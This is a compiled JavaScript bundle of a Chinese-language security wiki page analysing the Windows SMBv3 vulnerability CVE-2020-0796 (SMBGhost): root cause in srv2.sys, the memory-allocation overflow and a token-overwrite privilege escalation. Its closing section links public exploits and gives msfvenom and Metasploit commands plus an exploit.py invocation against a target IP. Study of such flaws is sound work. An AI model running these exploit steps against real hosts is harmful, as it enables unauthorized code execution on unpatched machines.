(window.webpackJsonp=window.webpackJsonp||[]).push([[6],{1996:function(e,s,t){e.exports=t.p+"assets/img/1627103590130-7efad360-17d2-447f-913d-70e7c955739d.8d2004d6.png"},1997:function(e,s,t){e.exports=t.p+"assets/img/1627103590143-26868338-bdac-4450-82a9-903865d6bccf.51f88306.png"},1998:function(e,s,t){e.exports=t.p+"assets/img/1627103608064-45c790ac-0255-4507-a3e0-87549c3cfbeb.2f7d9b97.png"},1999:function(e,s,t){e.exports=t.p+"assets/img/1627103608128-f0173921-1137-4014-8cc2-510e9d4ed187.be0c29ec.png"},2e3:function(e,s,t){e.exports=t.p+"assets/img/1627103608120-89f12b49-091d-4927-9611-6a8f2fdcddcc.acc8d542.png"},2001:function(e,s,t){e.exports=t.p+"assets/img/1627103608165-055f3029-8b10-4c7c-a747-2e590bd81f62.2fe413e6.png"},2002:function(e,s,t){e.exports=t.p+"assets/img/1627103608301-0c3eff1f-7647-4879-80ab-bda6a5f296e2.afabe313.png"},2003:function(e,s,t){e.exports=t.p+"assets/img/1627103608909-861bbd82-b9c0-4fba-ba59-7be668f343eb.9b1b425f.png"},2004:function(e,s,t){e.exports=t.p+"assets/img/1627103609167-409eade1-c459-4574-ad97-44f132fb89aa.696998ce.png"},2005:function(e,s,t){e.exports=t.p+"assets/img/1627103609243-cb1271f9-26ce-42a4-b70f-371ffdf8928c.0094c902.png"},2006:function(e,s,t){e.exports=t.p+"assets/img/1627103609249-7cb52d25-27e2-431d-bfa2-f2ab65619949.85ec4ec5.png"},2007:function(e,s,t){e.exports=t.p+"assets/img/1627103609266-3e79a148-d677-42e9-8aff-5534c5cea03d.1945446e.png"},2008:function(e,s,t){e.exports=t.p+"assets/img/1627103609453-a5e58e1c-cab0-4b26-a0f0-97018dad5d49.800fb954.png"},2009:function(e,s,t){e.exports=t.p+"assets/img/1627103610158-886f5c7b-5631-4866-ac8a-1928e44d070d.3e5c4149.png"},2010:function(e,s,t){e.exports=t.p+"assets/img/1627103610224-2ebcf803-253f-4a7e-96bc-83f1d1c30afd.e8f81d8a.png"},2011:function(e,s,t){e.exports=t.p+"assets/img/1627103610225-cee1b871-7a6a-4147-9839-84a117a2e09d.591975c8.png"},2012:function(e,s,t){e.exports=t.p+"assets/img/1627103610261-f1cba6bf-6870-41b7-bb01-c8933df88a43.cd257f4f.png"},2013:function(e,s,t){e.exports=t.p+"assets/img/1627103610298-982f6ead-a91f-46c8-85fa-5f69f436f47f.54a3c7af.png"},2014:function(e,s,t){e.exports=t.p+"assets/img/1627103611100-9024e27a-d488-4c8c-861e-f791256c65ed.a1776907.png"},2015:function(e,s,t){e.exports=t.p+"assets/img/1627103611077-e1fc15be-d3ea-4036-82f2-5cf7a90f7ea9.5f4dc674.png"},2016:function(e,s,t){e.exports=t.p+"assets/img/1627103611172-2054aa5a-50ed-4b22-b507-2e2708bb277b.d8658c86.png"},2017:function(e,s,t){e.exports=t.p+"assets/img/1627103611207-6e81b26c-ebc8-4012-a66a-cd4cb919ca53.243e404c.png"},3175:function(e,s,t){"use strict";t.r(s);var a=t(64),r=Object(a.a)({},(function(){var e=this,s=e._self._c;return s("ContentSlotsDistributor",{attrs:{"slot-key":e.$parent.slotKey}},[s("h1",{attrs:{id:"windows-smb远程代码执行漏洞-cve-2020-0796"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#windows-smb远程代码执行漏洞-cve-2020-0796"}},[e._v("#")]),e._v(" Windows SMB远程代码执行漏洞 CVE-2020-0796")]),e._v(" "),s("h2",{attrs:{id:"漏洞描述"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[e._v("#")]),e._v(" 漏洞描述")]),e._v(" "),s("p",[e._v("2020年3月10日，微软在其官方SRC发布了CVE-2020-0796的安全公告（ADV200005，MicrosoftGuidance for Disabling SMBv3 Compression）,公告表示在Windows SMBv3版本的客户端和服务端存在远程代码执行漏洞。同时指出该漏洞存在于MicroSoft Server Message Block 3.1.1协议处理特定请求包的功能中，攻击者利用该漏洞可在目标SMB Server或者Client中执行任意代码")]),e._v(" "),s("h2",{attrs:{id:"漏洞影响"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#漏洞影响"}},[e._v("#")]),e._v(" 漏洞影响")]),e._v(" "),s("a-checkbox",{attrs:{checked:""}},[e._v("SMB版本 v3.1.1")]),s("br"),e._v(" "),s("a-checkbox",{attrs:{checked:""}},[e._v("Windows 10 Version 1903 for 32-bit SystemsWindows 10 Version 1903 for x64-based SystemsWindows 10 Version 1903 for ARM64-based SystemsWindows Server, Version 1903 (Server Core installation)Windows 10 Version 1909 for 32-bit SystemsWindows 10 Version 1909 for x64-based SystemsWindows 10 Version 1909 for ARM64-based SystemsWindows Server, Version 1909 (Server Core installation)")]),s("br"),e._v(" "),s("h2",{attrs:{id:"漏洞复现"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[e._v("#")]),e._v(" 漏洞复现")]),e._v(" "),s("p",[e._v("下载对应的存在漏洞的系统版本")]),e._v(" "),s("p",[s("img",{attrs:{src:t(1996),alt:"img"}})]),e._v(" "),s("p",[e._v("安装后执行命令 winver 查看系统版本，并查看是否含有 "),s("code",[e._v("KB4551762补丁")])]),e._v(" "),s("p",[s("img",{attrs:{src:t(1997),alt:"img"}})]),e._v(" "),s("p",[s("code",[e._v("CVE-2020-0796")]),e._v("漏洞存在于受影响版本的Windows驱动srv2.sys中。"),s("code",[e._v("Windows SMB v3.1.1")]),e._v("版本增加了对压缩数据的支持。图2所示为带压缩数据的SMB数据报文的构成。")]),e._v(" "),s("p",[s("img",{attrs:{src:t(1998),alt:"img"}})]),e._v(" "),s("p",[e._v("ProtocolId：4字节，固定为"),s("code",[e._v("0x424D53FC")]),e._v(" "),s("code",[e._v("OriginalComressedSegmentSize")]),e._v("：4字节，原始的未压缩数据大小\n"),s("code",[e._v("CompressionAlgorithm")]),e._v("：2字节，压缩算法\n"),s("code",[e._v("Flags")]),e._v("：2字节，详见协议文档\n"),s("code",[e._v("Offset/Length")]),e._v("：根据Flags的取值为Offset或者Length，Offset表示数据包中压缩数据相对于当前结构的偏移")]),e._v(" "),s("p",[s("img",{attrs:{src:t(1999),alt:"img"}})]),e._v(" "),s("p",[e._v("srv2.sys中处理SMBv3压缩数据包的解压函数"),s("code",[e._v("Srv2DecompressData")]),e._v("未严格校验数据包中"),s("code",[e._v("OriginalCompressedSegmentSize")]),e._v("和"),s("code",[e._v("Offset/Length")]),e._v("字段的合法性。而这两个字段影响了"),s("code",[e._v("Srv2DecompressData")]),e._v("中内存分配函数"),s("code",[e._v("SrvNetAllocateBuffer")]),e._v("的参数。如图4所示的"),s("code",[e._v("Srv2DecompressData")]),e._v("函数反编译代码，"),s("code",[e._v("SrvNetAllocateBuffer")]),e._v("实际的参数为"),s("code",[e._v("OriginalCompressedSegmentSize+Offset")]),e._v("。这两个参数都直接来源于数据包中SMB Compression Transform Header中的字段，而函数并未判断这两个字段是否合法，就直接将其相加后作为内存分配的参数(unsigned int类型）。")]),e._v(" "),s("p",[s("img",{attrs:{src:t(2e3),alt:"img"}})]),e._v(" "),s("p",[e._v("这里，"),s("code",[e._v("OriginalCompressedSegmentSize+Offset")]),e._v("可能小于实际需要分配的内存大小，从而在后续调用解压函数"),s("code",[e._v("SmbCompressionDecompress")]),e._v("过程中存在越界读取或者写入的风险。")]),e._v(" "),s("p",[e._v("目前已公开的针对该漏洞的本地提权利用包含如下的主要过程：\n（1）验证程序首先创建到"),s("code",[e._v("SMS server")]),e._v("的会话连接（记为session）。\n（2）验证程序获取自身token数据结构中"),s("code",[e._v("privilege")]),e._v("成员在内核中的地址（记tokenAddr）。\n（3）验证程序通过"),s("code",[e._v("session")]),e._v("发送畸形压缩数据（记为evilData）给SMB server触发漏洞。其中，evilData包含tokenAddr、权限数据、溢出占位数据。\n（4） "),s("code",[e._v("SMS server")]),e._v("收到evilData后触发漏洞，并修改tokenAddr地址处的权限数据，从而提升验证程序的权限。\n（5）验证程序获取权限后对winlogon进行控制，"),s("code",[e._v("来创建system用户shell")]),e._v("。")]),e._v(" "),s("p",[e._v("首先，看一下已公开利用的"),s("code",[e._v("evilData")]),e._v("数据包")]),e._v(" "),s("p",[s("img",{attrs:{src:t(2001),alt:"img"}})]),e._v(" "),s("p",[e._v("数据包的内容很简单，其中几个关键字段数据如下：")]),e._v(" "),s("p",[e._v("OriginalSize ：0xffffffff\nOffset：0x10\nReal compressed data ：13字节的压缩数据，解压后应为"),s("code",[e._v("1108字节’A’加8字节的")]),e._v("token地址。\nSMB3 raw data ：实际上是由2个8字节的"),s("code",[e._v("0x1FF2FFFFBC")]),e._v("（总长0x10)加上0x13字节的压缩数据组成")]),e._v(" "),s("p",[e._v("从上面的漏洞原理分析可知，漏洞成因是"),s("code",[e._v("Srv2DecompressData")]),e._v("函数对报文字段缺乏合法性判断造成内存分配不当。在该漏洞数据包中，OriginalSize 是一个畸形值。"),s("code",[e._v("OriginalSize+ Offset = 0xffffffff + 0x10 = 0xf")]),e._v("是一个很小的值，其将会传递给"),s("code",[e._v("SrvNetAllocateBuffer")]),e._v("进行调用，下面具体分析内存分配情况。"),s("code",[e._v("SrvNetAllocateBuffer")]),e._v("的反编译代码")]),e._v(" "),s("p",[s("img",{attrs:{src:t(2002),alt:"img"}})]),e._v(" "),s("p",[e._v("由于传给"),s("code",[e._v("SrvNetAllocateBuffer")]),e._v("的参数为0xf，根据SrvNetAllocateBuffer的处理流程可知，该请求内存将从SrvNetBufferLookasides表中分配。这里需要注意的是，变量"),s("code",[e._v("SrvDisableNetBufferLookAsideList")]),e._v("跟注册表项相关，系统默认状态下"),s("code",[e._v("SrvDisableNetBufferLookAsideList")]),e._v("为0。")]),e._v(" "),s("p",[s("img",{attrs:{src:t(2003),alt:"img"}})]),e._v(" "),s("p",[s("code",[e._v("SrvNetBufferLookasides")]),e._v("表通过函数SrvNetCreateBuffer初始化，实际"),s("code",[e._v("SrvNetCreateBuffer")]),e._v("循环调用了"),s("code",[e._v("SrvNetBufferLookasideAllocate")]),e._v("分配内存，调用"),s("code",[e._v("SrvNetBufferLookasideAllocate")]),e._v("的参数分别为[‘0x1100’, ‘0x2100’, ‘0x4100’, ‘0x8100’, ‘0x10100’, ‘0x20100’, ‘0x40100’, ‘0x80100’, ‘0x100100’]。在这里，内存分配参数为0xf，对应的lookaside表为0x1100大小的表项。")]),e._v(" "),s("p",[s("img",{attrs:{src:t(2004),alt:"img"}})]),e._v(" "),s("p",[s("code",[e._v("SrvNetBufferLookasideAllocate")]),e._v("函数实际是调用"),s("code",[e._v("SrvNetAllocateBufferFromPool")]),e._v("来分配内存")]),e._v(" "),s("p",[s("img",{attrs:{src:t(2005),alt:"img"}})]),e._v(" "),s("p",[e._v("在函数"),s("code",[e._v("SrvNetAllocateBufferFromPool")]),e._v("中，对于用户请求的内存分配大小，内部通过"),s("code",[e._v("ExAllocatePoolWithTag")]),e._v("函数分配的内存实际要大于请求值（多出部分用于存储部分内存相关数据结构）。以请求分配0x1100大小为例，经过一系列判断后，最后分配的内存大小allocate_size= 0x1100 + E8 + 2*(MmSizeOfMdl + 8)。")]),e._v(" "),s("p",[s("img",{attrs:{src:t(2006),alt:"img"}})]),e._v(" "),s("p",[e._v("内存分配完毕之后，"),s("code",[e._v("SrvNetAllocateBufferFromPool")]),e._v("函数还对分配的内存进行了一系列初始化操作，最后返回了一个内存信息结构体指针作为函数的返回值。")]),e._v(" "),s("p",[s("img",{attrs:{src:t(2007),alt:"img"}})]),e._v(" "),s("p",[e._v("这里需要注意如下的数据关系："),s("code",[e._v("SrvNetAllocateBufferFromPool")]),e._v("函数返回值"),s("code",[e._v("return_buffer")]),e._v("指向一个内存数据结构，该内存数据结构起始地址同实际分配内存（函数"),s("code",[e._v("ExAllocatePoolWithTag")]),e._v("分配的内存）起始地址的的偏移为0x1150；return_buffer+0x18位置指向了实际分配内存起始地址偏移0x50位置处，而最终"),s("code",[e._v("return_buffer")]),e._v("会作为函数"),s("code",[e._v("SrvNetAllocateBuffer")]),e._v("的返回值")]),e._v(" "),s("p",[s("img",{attrs:{src:t(2008),alt:"img"}})]),e._v(" "),s("p",[e._v("回到漏洞解压函数"),s("code",[e._v("Srv2DecompressData")]),e._v("，在进行内存分配之后，"),s("code",[e._v("Srv2DecompressData")]),e._v("调用函数"),s("code",[e._v("SmbCompressionDecompress")]),e._v("开始解压被压缩的数据")]),e._v(" "),s("p",[s("img",{attrs:{src:t(2009),alt:"img"}})]),e._v(" "),s("p",[e._v("实际上，该函数调用了Windows库函数"),s("code",[e._v("RtlDecompressBufferEx2")]),e._v("来实现解压，根据RtlDecompressBufferEx2的函数原型来对应分析"),s("code",[e._v("SmbCompressionDecompress")]),e._v("函数的各个参数。")]),e._v(" "),s("p",[s("code",[e._v("SmbCompressionDecompress(CompressAlgo")]),e._v("，//压缩算法\n"),s("code",[e._v("Compressed_buf")]),e._v("，//指向数据包中的压缩数据\n"),s("code",[e._v("Compressed_size")]),e._v("，//数据包中压缩数据大小，计算得到\n"),s("code",[e._v("UnCompressedBuf")]),e._v(",//解压后的数据存储地址，*(alloc_buffer+0x18)+0x10\n"),s("code",[e._v("UnCompressedSize")]),e._v(",//压缩数据原始大小,源于数据包"),s("code",[e._v("OriginalCompressedSegmentSize")]),e._v(" "),s("code",[e._v("FinalUnCompressedSize")]),e._v("//最终解压后数据大小")]),e._v(" "),s("p",[e._v("从反编译代码可以看出，函数"),s("code",[e._v("SmbCompressionDecompress")]),e._v("中保存解压后数据的地址为*(alloc_buffer+0x18)+0x10的位置，根据内存分配过程分析，alloc_buffer + 0x18指向了实际内存分配起始位置偏移0x50处，所以拷贝目的地址为实际内存分配起始地址偏移0x60位置处。")]),e._v(" "),s("p",[e._v("在解压过程中，压缩数据解压后将存储到这个地址指向的内存中。根据evilData数据的构造过程，解压后的数据为占坑数据和tokenAddr。拷贝到该处地址后，tokenAddr将覆盖原内存数据结构中alloc_buffer+0x18处的数据。也就是解压缩函数"),s("code",[e._v("SmbCompressionDecompress")]),e._v("返回后，alloc_buffer+0x18将指向验证程序的tokenAddr内核地址")]),e._v(" "),s("p",[s("img",{attrs:{src:t(2010),alt:"img"}})]),e._v(" "),s("p",[s("img",{attrs:{src:t(2011),alt:"img"}})]),e._v(" "),s("p",[e._v("继续看"),s("code",[e._v("Srv2DecompressData")]),e._v("的后续处理流程，解压成功后，函数判断offset的结果不为0。不为0则进行内存移动，内存拷贝的参数如下：")]),e._v(" "),s("p",[s("code",[e._v("memmove(*(alloc_buffer+0x18)，SMB_payload，offset)")])]),e._v(" "),s("p",[e._v("此时alloc_buffer+0x18已经指向验证程序的tokenAddr内核地址，而SMB_payload此时指向evilData中的权限数据，offset则为0x10。因此，这个内存移动完成后，权限数据将写入tokenAddr处。这意味着，SMS Server成功修改了验证程序的权限，从而实现了验证程序的提权！")]),e._v(" "),s("p",[e._v("还有一个细节需要注意，在解压时，"),s("code",[e._v("Srv2DecompressData")]),e._v("函数会判断实际的解压后数据大小"),s("code",[e._v("FinalUnCompressedSize")]),e._v("是否和数据包中原始数据大小"),s("code",[e._v("OriginalCompressedSegmentSize")]),e._v("一致")]),e._v(" "),s("p",[s("img",{attrs:{src:t(2012),alt:"img"}})]),e._v(" "),s("p",[e._v("按理来说实际解压后的数据大小为0x1100，不等于数据包中的原始压缩数据大小0xffffffff，这里应该进入到后面内存释放的流程。然而，实际上在函数"),s("code",[e._v("SmbCompressionDecompress")]),e._v("中，调用"),s("code",[e._v("RtlDecompressBufferEx2")]),e._v("成功后会直接将"),s("code",[e._v("OriginalCompressedSegmentSize")]),e._v("赋值给"),s("code",[e._v("FinalUnCompressedSize")]),e._v("。这也是该漏洞关于任意地址写入成功的关键之一。")]),e._v(" "),s("p",[s("img",{attrs:{src:t(2013),alt:"img"}})]),e._v(" "),s("h2",{attrs:{id:"漏洞poc"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#漏洞poc"}},[e._v("#")]),e._v(" 漏洞POC")]),e._v(" "),s("a-alert",{attrs:{type:"success",message:"CVE-2020-0796 目标探测(奇安信) http://dl.qianxin.com/skylar6/CVE-2020-0796-Scanner.zip",description:"",showIcon:""}}),e._v(" "),s("br"),e._v("\n使用奇安信的漏洞扫描来探测\n"),s("p",[s("img",{attrs:{src:t(2014),alt:"img"}}),e._v(" "),s("br")]),e._v(" "),s("a-alert",{attrs:{type:"success",message:"CVE-2020-0796 本地提权EXP https://github.com/danigargu/CVE-2020-0796",description:"",showIcon:""}}),e._v(" "),s("br"),e._v(" "),s("p",[e._v("运行应用程序后弹出cmd窗口为 system权限")]),e._v(" "),s("p",[s("img",{attrs:{src:t(2015),alt:"img"}})]),e._v(" "),s("p",[e._v("或者使用 MSF的内置EXP windows/local/cve_2020_0796_smbghost 来本地提权")]),e._v(" "),s("a-alert",{attrs:{type:"success",message:"https://github.com/chompie1337/SMBGhost_RCE_PoC",description:"",showIcon:""}}),e._v(" "),s("br"),e._v(" "),s("p",[s("code",[e._v("msfvenom生成reversed shellcode")])]),e._v(" "),s("p",[s("code",[e._v("msfvenom -p windows/x64/meterpreter/bind_tcp lport=2333 -f py -o exp.py")])]),e._v(" "),s("p",[e._v("将生成exp.py中的shellcode替换exploit.py中的shellcode")]),e._v(" "),s("p",[s("img",{attrs:{src:t(2016),alt:"img"}})]),e._v(" "),s("p",[s("img",{attrs:{src:t(2017),alt:"img"}})]),e._v(" "),s("p",[s("code",[e._v("buf 要替换为 USER_PAYLOAD")]),e._v("，使用 MSF, "),s("code",[e._v("注意有蓝屏概率")])]),e._v(" "),s("div",{staticClass:"language-shell line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-shell"}},[s("code",[e._v("msf5 "),s("span",{pre:!0,attrs:{class:"token operator"}},[e._v(">")]),e._v(" use exploit/multi/handler \n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v("[")]),e._v("*"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v("]")]),e._v(" Using configured payload generic/shell_reverse_tcp\nmsf5 exploit"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v("(")]),e._v("multi/handler"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v(")")]),e._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[e._v(">")]),e._v(" "),s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[e._v("set")]),e._v(" payload windows/x64/meterpreter/bind_tcp\npayload "),s("span",{pre:!0,attrs:{class:"token operator"}},[e._v("=")]),s("span",{pre:!0,attrs:{class:"token operator"}},[e._v(">")]),e._v(" windows/x64/meterpreter/bind_tcp\nmsf5 exploit"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v("(")]),e._v("multi/handler"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v(")")]),e._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[e._v(">")]),e._v(" "),s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[e._v("set")]),e._v(" lport "),s("span",{pre:!0,attrs:{class:"token number"}},[e._v("2333")]),e._v("\nlport "),s("span",{pre:!0,attrs:{class:"token operator"}},[e._v("=")]),s("span",{pre:!0,attrs:{class:"token operator"}},[e._v(">")]),e._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[e._v("2333")]),e._v("\nmsf5 exploit"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v("(")]),e._v("multi/handler"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v(")")]),e._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[e._v(">")]),e._v(" "),s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[e._v("set")]),e._v(" rhost "),s("span",{pre:!0,attrs:{class:"token number"}},[e._v("192.168")]),e._v(".1.110\nrhost "),s("span",{pre:!0,attrs:{class:"token operator"}},[e._v("=")]),s("span",{pre:!0,attrs:{class:"token operator"}},[e._v(">")]),e._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[e._v("192.168")]),e._v(".1.110\nmsf5 exploit"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v("(")]),e._v("multi/handler"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[e._v(")")]),e._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[e._v(">")]),e._v(" exploit\n执行脚本即可\npython3 exploit.py  "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[e._v("-ip")]),e._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[e._v("192.168")]),e._v(".1.110\n")])]),e._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[e._v("1")]),s("br"),s("span",{staticClass:"line-number"},[e._v("2")]),s("br"),s("span",{staticClass:"line-number"},[e._v("3")]),s("br"),s("span",{staticClass:"line-number"},[e._v("4")]),s("br"),s("span",{staticClass:"line-number"},[e._v("5")]),s("br"),s("span",{staticClass:"line-number"},[e._v("6")]),s("br"),s("span",{staticClass:"line-number"},[e._v("7")]),s("br"),s("span",{staticClass:"line-number"},[e._v("8")]),s("br"),s("span",{staticClass:"line-number"},[e._v("9")]),s("br"),s("span",{staticClass:"line-number"},[e._v("10")]),s("br"),s("span",{staticClass:"line-number"},[e._v("11")]),s("br")])])],1)}),[],!1,null,null,null);s.default=r.exports}}]);